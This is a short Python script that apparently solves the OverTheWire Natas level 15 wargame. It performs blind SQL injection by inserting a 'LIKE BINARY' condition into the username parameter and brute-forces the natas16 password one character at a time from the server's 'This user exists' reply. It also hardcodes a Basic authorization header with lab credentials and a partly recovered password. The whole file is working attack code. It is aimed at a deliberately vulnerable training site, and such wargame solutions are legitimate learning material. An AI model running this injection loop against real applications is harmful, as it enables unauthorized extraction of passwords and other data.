import requests

crib = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"

while True:
	happened = False
	for c in range(ord('!'), ord('~')+1):
		if (chr(c) in "_%\\"): continue
		
		like = crib + chr(c)

		url = f'http://natas15.natas.labs.overthewire.org'
		headers = {"Authorization":"Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA=="}
		params = {"debug": "true", "username": f'natas16" AND password LIKE BINARY "{like}%'}

		resp = requests.get(url, params=params, headers=headers)

		there = "This user exists" in resp.text
		error = "Error in query" in resp.text
		print(like, there, error)
		#print(resp.text)
		
		if there:
			crib = like
			happened = True
			break
			
	if not happened: break

print(crib)
